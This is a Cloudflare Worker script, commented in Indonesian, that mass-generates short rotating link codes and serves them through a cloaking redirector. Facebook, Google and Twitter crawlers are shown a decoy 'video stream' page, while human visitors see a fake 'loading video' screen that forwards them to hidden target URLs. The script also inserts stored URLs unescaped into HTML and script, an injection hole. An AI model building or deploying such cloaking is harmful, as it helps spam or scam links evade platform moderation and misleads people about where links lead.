export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // 1. API: MEMPROSES DAN MENYIMPAN BULK GENERATE LINK (TIDAK BOLEH DI-CACHE)
    if (url.pathname === "/api/generate-links" && request.method === "POST") {
      try {
        const { links, count } = await request.json();
        if (!links || !Array.isArray(links) || links.length === 0) {
          return new Response(JSON.stringify({ success: false, error: "Daftar link kosong." }), { status: 400 });
        }

        const variations = [];
        const statements = [];
        const insertStmt = env.DB.prepare("INSERT INTO link_rotators (random_code, target_url) VALUES (?, ?)");

        for (const targetUrl of links) {
          for (let i = 0; i < count; i++) {
            const karakter = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let kodeAcak = "";
            for (let j = 0; j < 9; j++) {
              karakter.charAt(Math.floor(Math.random() * karakter.length));
              kodeAcak += karakter.charAt(Math.floor(Math.random() * karakter.length));
            }
            statements.push(insertStmt.bind(kodeAcak, targetUrl));
            variations.push(kodeAcak);
          }
        }

        if (statements.length > 0) {
          await env.DB.batch(statements);
        }

        return new Response(JSON.stringify({ success: true, variations }), {
          headers: { "Content-Type": "application/json" }
        });
      } catch (err) {
        return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
      }
    }

    // 2. MAIN ENGINE: PENGALIHAN + SISTEM ANTI-BOT DENGAN RESPONSE HEADERS CACHE (Paling Aman)
    if (
      url.pathname !== "/" && 
      url.pathname !== "" && 
      !url.pathname.endsWith(".html") && 
      !url.pathname.includes("tool") && 
      !url.pathname.startsWith("/api/")
    ) {
      try {
        let kodeUrl = url.pathname.replace("/", "");
        if (kodeUrl.endsWith(".mp4")) {
          kodeUrl = kodeUrl.replace(".mp4", "");
        }

        // DETEKSI USER-AGENT BOT
        const userAgent = (request.headers.get("user-agent") || "").toLowerCase();
        const isBot = 
          userAgent.includes("facebookexternalhit") || 
          userAgent.includes("facebot") || 
          userAgent.includes("facebookplatform") ||
          userAgent.includes("googlebot") || 
          userAgent.includes("twitterbot") || 
          userAgent.includes("bot") || 
          userAgent.includes("crawl") || 
          userAgent.includes("spider");

        // JIKA YANG DATANG ADALAH BOT (Langsung beri instruksi cache di browser/edge server)
        if (isBot) {
          const botUmpanHtml = `
          <!DOCTYPE html>
          <html lang="id">
          <head>
              <meta charset="UTF-8">
              <title>Video Storage Engine</title>
              <style>body{font-family:sans-serif;background:#0e121a;color:#fff;text-align:center;padding:50px;}</style>
          </head>
          <body>
              <h2>Stream Server Active</h2>
              <p>Status: File MP4 encoded successfully. Ready for stream streaming.</p>
          </body>
          </html>
          `;
          
          return new Response(botUmpanHtml, { 
            headers: { 
              "Content-Type": "text/html; charset=utf-8",
              "Cache-Control": "public, max-age=14400" // Bot disuruh simpan cache selama 4 jam
            } 
          });
        }

        // JIKA YANG DATANG MANUSIA (PANGGIL D1)
        const dataLink = await env.DB.prepare("SELECT target_url FROM link_rotators WHERE random_code = ?")
          .bind(kodeUrl)
          .first();

        if (dataLink && dataLink.target_url) {
          const loadingHtml = `
          <!DOCTYPE html>
          <html lang="id">
          <head>
              <meta charset="UTF-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title>Memuat Video...</title>
              <style>
                  body { margin: 0; padding: 0; background-color: #0e121a; color: #ffffff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
                  .loading-container { text-align: center; padding: 20px; }
                  .spinner { width: 50px; height: 50px; border: 4px solid rgba(24, 119, 242, 0.1); border-left-color: #1877f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
                  .text { font-size: 16px; font-weight: 500; color: #e4e6eb; margin-bottom: 25px; }
                  .btn-redirect { display: inline-block; background-color: #1877f2; color: white; text-decoration: none; padding: 10px 20px; font-size: 14px; font-weight: bold; border-radius: 5px; box-shadow: 0 4px 6px rgba(0,0,0,0.2); }
                  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
              </style>
          </head>
          <body>
          <div class="loading-container">
              <div class="spinner"></div>
              <div class="text">Menyiapkan video...</div>
              <a href="${dataLink.target_url}" class="btn-redirect">Klik di sini jika tidak pindah otomatis</a>
          </div>
          <script>
              var target = "${dataLink.target_url}";
              try { window.location.replace(target); } catch(e) { window.location.href = target; }
              setTimeout(function() { try { window.location.replace(target); } catch(e) { window.location.href = target; } }, 3000);
          </script>
          </body>
          </html>
          `;
          
          return new Response(loadingHtml, { 
            headers: { 
              "Content-Type": "text/html; charset=utf-8",
              "Cache-Control": "public, max-age=14400" // Kasih tahu Cloudflare Edge untuk meng-cache halaman ini selama 4 jam
            } 
          });

        } else {
          return new Response("Waduh, link variasi ini tidak valid.", { status: 404 });
        }
      } catch (err) {
        return new Response("Terjadi kesalahan sistem.", { status: 500 });
      }
    }

    return env.ASSETS.fetch(request);
  }
};
